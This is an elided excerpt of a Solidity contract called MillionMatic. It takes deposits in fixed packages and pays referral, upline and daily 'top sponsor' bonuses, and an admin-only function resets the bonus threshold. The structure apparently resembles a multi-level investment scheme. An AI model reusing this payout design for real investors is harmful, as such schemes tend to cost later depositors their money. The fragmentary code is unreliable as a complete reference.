...
contract MillionMatic {
    ...
    uint256[] public daily_top_bonuses=[5,3,2];     
    uint256 public daily_top_last_draw = block.timestamp;
    uint256 public daily_top_cycle;
	uint256 public QUALIFY_TOP_BONUS = 250 ether;
    ...
    uint256[5] public defaultPackages = [25 ether,50 ether,100 ether ,200 ether,500 ether];
  ...
  function _refPayout(address _addr, uint256 _amount) internal {
    ...
    function customDrawTop() external{
    ...
    function invest(address referrer) public payable {
		...
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 25 Matic');
  ...
  function TotalBonus(address _user) public view returns(uint256){
     ...
     uint256 TotalEarn = users[_user].referrerBonus.add(_userUplineIncome(_user)).add(users[_user].singleDownlineBonus).add(users[_user].topsponsorbonus);
  ...
  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
   ...
   function update_qualify_top_bonus(uint _amount) external {
        require(admin==msg.sender, 'Admin what?');
        QUALIFY_TOP_BONUS = _amount;
   }
